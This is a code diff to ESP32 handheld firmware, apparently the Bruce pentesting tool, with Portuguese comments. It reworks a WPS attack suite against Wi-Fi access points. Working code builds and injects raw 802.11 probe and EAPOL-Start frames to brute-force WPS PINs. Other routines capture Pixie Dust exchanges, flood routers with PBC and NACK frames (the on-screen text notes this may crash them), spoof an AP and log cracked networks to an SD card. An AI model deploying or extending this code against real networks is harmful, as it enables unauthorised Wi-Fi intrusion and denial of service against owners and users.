@@ -66,6 +66,9 @@ static String bssidStr(const uint8_t* mac) {
 // Caminho no SD onde redes quebradas são salvas
 static const char* WPS_CRACKED_FILE = "/WPS/cracked.txt";
 
+// Define para limite de tempo de ataques
+#define MAX_ATTACK_TIME 300000 // 5 min
+
 // Salva rede quebrada no SD card
 void wpsSaveCracked(const WPSNetworkInfo& net, const char* pin) {
     if (!setupSdCard()) return;
@@ -220,7 +223,7 @@ static bool wpsInitInjectionMode(uint8_t channel) {
     vTaskDelay(pdMS_TO_TICKS(200));
 
     // Cria AP oculto no canal alvo
-    if (!WiFi.softAP("WPSTest", emptyString, channel, 1, 4, false)) {
+    if (!WiFi.softAP("WPS_SPOOF", "", channel, 1, 4, true)) {
         displayError("Falha ao criar AP", true);
         return false;
     }
@@ -231,6 +234,15 @@ static bool wpsInitInjectionMode(uint8_t channel) {
     return true;
 }
 
+// Verifica se o WiFi está em modo APSTA antes de enviar frames
+static bool wpsEnsureAPSTAMode() {
+    if (WiFi.getMode() != WIFI_MODE_APSTA) {
+        displayError("WiFi não em APSTA", true);
+        return false;
+    }
+    return true;
+}
+
 // Finaliza modo de injeção
 static void wpsDeinitInjectionMode() {
     WiFi.softAPdisconnect(true);
@@ -238,6 +250,36 @@ static void wpsDeinitInjectionMode() {
     WiFi.disconnect(true);
     WiFi.mode(WIFI_MODE_NULL);
     vTaskDelay(pdMS_TO_TICKS(100));
+}
+
+// Menu for selecting a WPS AP target from scan results
+bool selectWPSTarget(const std::vector<WPSNetworkInfo>& networks, const char* title, WPSNetworkInfo& target_out) {
+    if (networks.empty()) return false;
+
+    int sel_idx = -1;
+    options.clear();
+
+    for (size_t i = 0; i < networks.size(); i++) {
+        String name = String(networks[i].ssid);
+        if (name.length() == 0) name = "<Hidden>";
+
+        // Add cracked indicator
+        if (networks[i].cracked) {
+            name = "[C] " + name;
+        }
+
+        options.push_back({name.substring(0, 20).c_str(), [&sel_idx, i]() { sel_idx = i; }});
+    }
+
+    addOptionToMainMenu();
+    loopOptions(options, MENU_TYPE_SUBMENU, title);
+
+    if (sel_idx >= 0 && sel_idx < (int)networks.size()) {
+        target_out = networks[sel_idx];
+        return true;
+    }
+
+    return false;
 }
 
 // Scan de redes WPS — retorna cópia dos dados, limpa scan antes de retornar
@@ -287,12 +329,11 @@ std::vector<WPSNetworkInfo> scanWPSNetworks() {
     return results;
 }
 
-// Menu de seleção de alvo — salva dados do alvo antes de retornar
-static bool selectWPSTarget(const std::vector<WPSNetworkInfo>& networks,
-                             const char* title, WPSNetworkInfo& out) {
+// Menu de seleção de alvo — retorna o índice do alvo selecionado
+static int wpsInternalSelectTarget(const std::vector<WPSNetworkInfo>& networks, const char* title) {
     if (networks.empty()) {
         displayError("Nenhuma rede WPS encontrada", true);
-        return false;
+        return -1;
     }
 
     // Constroi labels como Strings persistentes
@@ -314,11 +355,11 @@ static bool selectWPSTarget(const std::vector<WPSNetworkInfo>& networks,
     addOptionToMainMenu();
     loopOptions(options, MENU_TYPE_SUBMENU, title);
 
-    if (returnToMenu || sel < 0) return false;
+    return (returnToMenu) ? -1 : sel;
+}
 
-    // Copia dados do alvo
-    memcpy(&out, &networks[sel], sizeof(WPSNetworkInfo));
-    return true;
+int wpsSelectTarget(const std::vector<WPSNetworkInfo>& networks) {
+    return wpsInternalSelectTarget(networks, "Selecionar Alvo WPS");
 }
 
 //================================================================================
@@ -327,18 +368,18 @@ static bool selectWPSTarget(const std::vector<WPSNetworkInfo>& networks,
 
 void wpsAttacksMenu() {
     options.clear();
-    options.push_back({"WPS Scan",         []() { wpsScan(); }});
-    options.push_back({"Auto All (WPS)",    []() { wpsAutoAll(); }});
-    options.push_back({"PIN Brute (Native)",[]() { wpsPinBruteForceNative(); }});
-    options.push_back({"PIN Brute (Raw)",   []() { wpsPinBruteForceRaw(); }});
-    options.push_back({"Pixie Dust (Native)",[]() { wpsPixieDustNative(); }});
-    options.push_back({"Pixie Dust (Raw)",  []() { wpsPixieDustRaw(); }});
-    options.push_back({"Null PIN Attack",   []() { wpsNullPinAttack(); }});
-    options.push_back({"PBC Flood",         []() { wpsPBCFlood(); }});
-    options.push_back({"Lockout Tester",    []() { wpsLockoutTester(); }});
-    options.push_back({"AP Spoof (WPS)",    []() { wpsAPSpoof(); }});
-    options.push_back({"NACK Flood",        []() { wpsNACKFlood(); }});
-    options.push_back({"Redes Quebradas",   []() { wpsViewCracked(); }});
+    options.push_back(Option("WPS Scan",         []() { wpsScan(); }));
+    options.push_back(Option("Auto All (WPS)",    []() { wpsAutoAll(); }));
+    options.push_back(Option("PIN Brute (Native)",[]() { wpsPinBruteForceNative(); }));
+    options.push_back(Option("PIN Brute (Raw)",   []() { wpsPinBruteForceRaw(); }));
+    options.push_back(Option("Pixie Dust (Native)",[]() { wpsPixieDustNative(); }));
+    options.push_back(Option("Pixie Dust (Raw)",  []() { wpsPixieDustRaw(); }));
+    options.push_back(Option("Null PIN Attack",   []() { wpsNullPinAttack(); }));
+    options.push_back(Option("PBC Flood",         []() { wpsPBCFlood(); }));
+    options.push_back(Option("Lockout Tester",    []() { wpsLockoutTester(); }));
+    options.push_back(Option("AP Spoof (WPS)",    []() { wpsAPSpoof(); }));
+    options.push_back(Option("NACK Flood",        []() { wpsNACKFlood(); }));
+    options.push_back(Option("Redes Quebradas",   []() { wpsViewCracked(); }));
     addOptionToMainMenu();
     loopOptions(options, MENU_TYPE_SUBMENU, "WPS Attacks");
 }
@@ -443,9 +484,15 @@ void wpsPinBruteForceNative() {
 
     // Use native esp_wifi_wps API
     esp_wps_config_t wps_config = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
+    uint32_t start_time = millis();
 
     for (uint32_t h1 = 0; h1 < 10000 && wps_attack_running; h1++) {
         for (uint32_t h2 = 0; h2 < 1000 && wps_attack_running; h2 += 100) {
+            if (millis() - start_time > MAX_ATTACK_TIME) {
+                wps_attack_running = false;
+                padprintln("Tempo maximo atingido!");
+                break;
+            }
             uint32_t pin_base = h1 * 1000 + h2;
             wpsGeneratePin(pin_base, pin_buf);
             attempts++;
@@ -485,19 +532,23 @@ void wpsPinBruteForceNative() {
             if (!wps_attack_running) break;
             esp_wifi_wps_disable();
             WiFi.disconnect();
-            vTaskDelay(pdMS_TO_TICKS(100));
+            vTaskDelay(pdMS_TO_TICKS(50)); // Better yield
 
             // Update display
             if (millis() - last_update > 500) {
                 drawMainBorderWithTitle("WPS PIN Brute");
                 tft.setTextColor(bruceConfig.priColor);
+                char disp_buf[64];
+                snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+                padprintln(disp_buf);
                 padprintln("");
-                padprintln("Alvo: " + String(target.ssid));
-                padprintln("");
-                padprintln(String(spinner[spin_idx]) + " Testando PIN : " + String(pin_buf));
-                padprintln("Tentativa    : " + String(attempts) + " / 100000");
+                snprintf(disp_buf, sizeof(disp_buf), "%c Testando PIN : %s", spinner[spin_idx], pin_buf);
+                padprintln(disp_buf);
+                snprintf(disp_buf, sizeof(disp_buf), "Tentativa    : %lu / 100000", (unsigned long)attempts);
+                padprintln(disp_buf);
                 float pct = (float)attempts / 100000.0f * 100.0f;
-                padprintln("Progresso    : " + String(pct, 2) + "%");
+                snprintf(disp_buf, sizeof(disp_buf), "Progresso    : %.2f%%", pct);
+                padprintln(disp_buf);
                 padprintln("");
                 padprintln("ESC para parar");
 
@@ -565,8 +616,20 @@ void wpsPinBruteForceRaw() {
     uint8_t probe[96];
     uint8_t src_mac[6];
 
+    uint32_t start_time = millis();
+
     for (uint32_t h1 = 0; h1 < 10000 && wps_attack_running; h1++) {
         for (uint32_t h2 = 0; h2 < 1000 && wps_attack_running; h2 += 100) {
+            if (millis() - start_time > MAX_ATTACK_TIME) {
+                wps_attack_running = false;
+                padprintln("Tempo maximo atingido!");
+                break;
+            }
+
+            if (!wpsEnsureAPSTAMode()) {
+                wps_attack_running = false;
+                break;
+            }
             uint32_t pin_base = (h1 * 1000) + h2;
             wpsGeneratePin(pin_base, pin_buf);
             attempts++;
@@ -605,7 +668,10 @@ void wpsPinBruteForceRaw() {
             probe[off++] = 0x10; probe[off++] = 0x08; // Config: PIN
             probe[off++] = 0x00;
 
-            esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);
+            if (err != ESP_OK) {
+                Serial.printf("TX falhou: %d\n", err);
+            }
 
             // EAP-Start frame
             uint8_t eapst[40];
@@ -618,18 +684,25 @@ void wpsPinBruteForceRaw() {
             eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
             eapst[30] = 0x88; eapst[31] = 0x8E; // 802.1X
             eapst[32] = 0x01; eapst[33] = 0x01; // EAPOL Start
-            esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);
+            err = esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);
+            if (err != ESP_OK) {
+                Serial.printf("TX falhou: %d\n", err);
+            }
 
             // Update display
             if (millis() - last_update > 500) {
                 drawMainBorderWithTitle("WPS PIN Brute");
                 tft.setTextColor(bruceConfig.priColor);
-                padprintln("");
-                padprintln("Alvo: " + String(target.ssid));
-                padprintln(String(spinner[spin_idx]) + " Testando PIN : " + String(pin_buf));
-                padprintln("Tentativa    : " + String(attempts) + " / 100000");
+                char disp_buf[64];
+                snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+                padprintln(disp_buf);
+                snprintf(disp_buf, sizeof(disp_buf), "%c Testando PIN : %s", spinner[spin_idx], pin_buf);
+                padprintln(disp_buf);
+                snprintf(disp_buf, sizeof(disp_buf), "Tentativa    : %u / 100000", attempts);
+                padprintln(disp_buf);
                 float pct = (float)attempts / 100000.0f * 100.0f;
-                padprintln("Progresso    : " + String(pct, 2) + "%");
+                snprintf(disp_buf, sizeof(disp_buf), "Progresso    : %.2f%%", pct);
+                padprintln(disp_buf);
                 padprintln("Enviando frames EAP/WSC");
                 padprintln("");
                 padprintln("ESC para parar");
@@ -746,7 +819,6 @@ void wpsPixieDustRaw() {
     esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(pixieSniffer);
 
-    wps_attack_running = true;
     uint32_t start_time = millis();
     uint32_t last_update = millis();
     uint32_t last_probe = 0;
@@ -754,6 +826,16 @@ void wpsPixieDustRaw() {
     uint8_t probe[72];
 
     while (wps_attack_running) {
+        if (millis() - start_time > MAX_ATTACK_TIME) {
+            wps_attack_running = false;
+            padprintln("Tempo maximo atingido!");
+            break;
+        }
+
+        if (!wpsEnsureAPSTAMode()) {
+            wps_attack_running = false;
+            break;
+        }
         // Envia probe + EAP-Start periodicamente para provocar trocas WPS
         if (millis() - last_probe > 3000) {
             generateRandomMac(src_mac);
@@ -820,15 +902,19 @@ void wpsPixieDustRaw() {
         if (millis() - last_update > 500) {
             drawMainBorderWithTitle("Pixie Dust (Raw)");
             tft.setTextColor(bruceConfig.priColor);
-            padprintln("");
-            padprintln("Alvo: " + String(target.ssid));
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
             padprintln("Injetando e ouvindo...");
-            padprintln("Tempo decorrido: " + String((millis() - start_time)/1000) + "s");
+            snprintf(disp_buf, sizeof(disp_buf), "Tempo: %lu s", (unsigned long)((millis() - start_time)/1000));
+            padprintln(disp_buf);
             padprintln("");
             padprintln("Status captura WSC:");
-            padprintln(String("M1: ") + (_pixie_has_m1 ? "[OK]" : "[--]"));
-            padprintln(String("M2: ") + (_pixie_has_m2 ? "[OK]" : "[--]"));
-            padprintln(String("M3: ") + (_pixie_has_m3 ? "[OK]" : "[--]"));
+            snprintf(disp_buf, sizeof(disp_buf), "M1: %s  M2: %s  M3: %s",
+                     _pixie_has_m1 ? "[OK]" : "[--]",
+                     _pixie_has_m2 ? "[OK]" : "[--]",
+                     _pixie_has_m3 ? "[OK]" : "[--]");
+            padprintln(disp_buf);
             padprintln("");
             padprintln("ESC para parar");
             last_update = millis();
@@ -870,6 +956,7 @@ void wpsNullPinAttack() {
     int num_pins = 12;
 
     wps_attack_running = true;
+    uint32_t start_time = millis();
     uint8_t src_mac[6];
     uint8_t frame[72];
     const char spinner[] = {'|', '/', '-', '\\'};
@@ -910,13 +997,26 @@ void wpsNullPinAttack() {
         esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);
 
         for (int step = 0; step < 15 && wps_attack_running; step++) {
+            if (millis() - start_time > MAX_ATTACK_TIME) {
+                wps_attack_running = false;
+                padprintln("Tempo maximo atingido!");
+                break;
+            }
+            if (!wpsEnsureAPSTAMode()) {
+                wps_attack_running = false;
+                break;
+            }
+
             drawMainBorderWithTitle("WPS Null PIN");
             tft.setTextColor(bruceConfig.priColor);
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
             padprintln("");
-            padprintln("Alvo: " + String(target.ssid));
-            padprintln("");
-            padprintln(String(spinner[spin_idx]) + " Injetando: " + String(null_pins[i]));
-            padprintln("Progresso: " + String(i+1) + " / " + String(num_pins));
+            snprintf(disp_buf, sizeof(disp_buf), "%c Injetando: %s", spinner[spin_idx], null_pins[i]);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "Progresso: %d / %d", i+1, num_pins);
+            padprintln(disp_buf);
             padprintln("");
             padprintln("Aguarde resposta do AP...");
             padprintln("ESC para parar");
@@ -1026,12 +1126,16 @@ void wpsPBCFlood() {
         if (millis() - last_update > 500) {
             drawMainBorderWithTitle("WPS PBC Flood");
             tft.setTextColor(bruceConfig.priColor);
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "Canal: %d", target.channel);
+            padprintln(disp_buf);
             padprintln("");
-            padprintln("Alvo: " + String(target.ssid));
-            padprintln("Canal: " + String(target.channel));
-            padprintln("");
-            padprintln(String(spinner[spin_idx]) + " Total Frames : " + String(total_frames));
-            padprintln("  Taxa Injeção : " + String(frame_count * 2) + " fps");
+            snprintf(disp_buf, sizeof(disp_buf), "%c Total Frames : %lu", spinner[spin_idx], (unsigned long)total_frames);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "  Taxa Injecao : %lu fps", (unsigned long)frame_count * 2);
+            padprintln(disp_buf);
             padprintln("");
             padprintln("O roteador pode travar o WPS");
             padprintln("ou reiniciar (DoS).");
@@ -1079,6 +1183,16 @@ void wpsLockoutTester() {
     uint8_t frame[72];
 
     while (wps_attack_running && attempts < 30) {
+        if (millis() - start_time > MAX_ATTACK_TIME) {
+            wps_attack_running = false;
+            padprintln("Tempo maximo atingido!");
+            break;
+        }
+
+        if (!wpsEnsureAPSTAMode()) {
+            wps_attack_running = false;
+            break;
+        }
         wpsGeneratePin((uint32_t)random(0, 9999999), pin_buf);
         generateRandomMac(src_mac);
 
@@ -1118,12 +1232,16 @@ void wpsLockoutTester() {
             uint32_t elapsed = (millis() - start_time) / 1000;
             drawMainBorderWithTitle("Lockout Test");
             tft.setTextColor(bruceConfig.priColor);
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "PIN: %s", pin_buf);
+            padprintln(disp_buf);
             padprintln("");
-            padprintln("Alvo: " + String(target.ssid));
-            padprintln("PIN: " + String(pin_buf));
-            padprintln("");
-            padprintln("Tentativas: " + String(attempts) + "/30");
-            padprintln("Tempo: " + String(elapsed) + "s");
+            snprintf(disp_buf, sizeof(disp_buf), "Tentativas: %lu/30", (unsigned long)attempts);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "Tempo: %lus", (unsigned long)elapsed);
+            padprintln(disp_buf);
             padprintln("");
             padprintln("ESC para parar");
             last_update = millis();
@@ -1174,7 +1292,7 @@ void wpsAPSpoof() {
     WiFi.disconnect(true);
     WiFi.mode(WIFI_MODE_AP);
     vTaskDelay(pdMS_TO_TICKS(300));
-    WiFi.softAP(target.ssid, emptyString, target.channel, 0, 4, false);
+    WiFi.softAP("WPS_SPOOF", "", target.channel, 1, 4, true); // Use dummy SSID and hidden
     vTaskDelay(pdMS_TO_TICKS(300));
 
     uint8_t our_mac[6];
@@ -1234,14 +1352,17 @@ void wpsAPSpoof() {
         uint32_t clients = 0;
         if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) clients = sta_list.num;
 
-        if (millis() - last_update > 1500) {
+        if (millis() - last_update > 500) {
             drawMainBorderWithTitle("WPS AP Spoof");
             tft.setTextColor(bruceConfig.priColor);
-            padprintln("");
-            padprintln("AP: " + String(target.ssid));
-            padprintln("");
-            padprintln("Beacons: " + String(beacon_count));
-            padprintln("Clientes: " + String(clients));
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
+            padprintln("Criando AP falso...");
+            snprintf(disp_buf, sizeof(disp_buf), "Beacons enviados: %lu", (unsigned long)beacon_count);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "Clientes conectados: %lu", (unsigned long)clients);
+            padprintln(disp_buf);
             padprintln("");
             padprintln("ESC para parar");
             last_update = millis();
@@ -1349,11 +1470,14 @@ void wpsNACKFlood() {
         if (millis() - last_update > 1000) {
             drawMainBorderWithTitle("WPS NACK Flood");
             tft.setTextColor(bruceConfig.priColor);
+            char disp_buf[64];
+            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
+            padprintln(disp_buf);
             padprintln("");
-            padprintln("Alvo: " + String(target.ssid));
-            padprintln("");
-            padprintln("Frames: " + String(frame_count));
-            padprintln("Canal: " + String(target.channel));
+            snprintf(disp_buf, sizeof(disp_buf), "Frames: %lu", (unsigned long)frame_count);
+            padprintln(disp_buf);
+            snprintf(disp_buf, sizeof(disp_buf), "Canal: %d", target.channel);
+            padprintln(disp_buf);
             padprintln("");
             padprintln("ESC para parar");
             frame_count = 0;
@@ -1439,16 +1563,12 @@ static void runAutoAllSequence(const WPSNetworkInfo& target) {
     // 2. Pixie Dust
     drawMainBorderWithTitle("Auto -> Pixie Dust");
     padprintln("Ativando Pixie Dust...");
-    padprintln("(Implementado com M1 nativo)");
-    vTaskDelay(pdMS_TO_TICKS(2000));
-    // wpsPixieDustInternal(target); // TODO
+    wpsPixieDustRaw(); // Use the existing raw implementation for capture
 
     // 3. Brute Force
     drawMainBorderWithTitle("Auto -> PIN Brute");
     padprintln("Iniciando Brute Force...");
-    padprintln("(Implementado com API nativa)");
-    vTaskDelay(pdMS_TO_TICKS(2000));
-    // wpsPinBruteForceInternal(target); // TODO
+    wpsPinBruteForceNative(); // Call existing native brute force
 }
 
 void wpsAutoAll() {
@@ -1457,8 +1577,9 @@ void wpsAutoAll() {
     padprintln("Escaneando redes WPS...");
 
     auto networks = scanWPSNetworks();
-    WPSNetworkInfo target;
-    if (!selectWPSTarget(networks, "Alvo Auto All", target)) return;
+    int sel = wpsInternalSelectTarget(networks, "Alvo Auto All");
+    if (sel < 0) return;
+    WPSNetworkInfo target = networks[sel];
 
     if (target.cracked) {
         drawMainBorderWithTitle("Aviso");
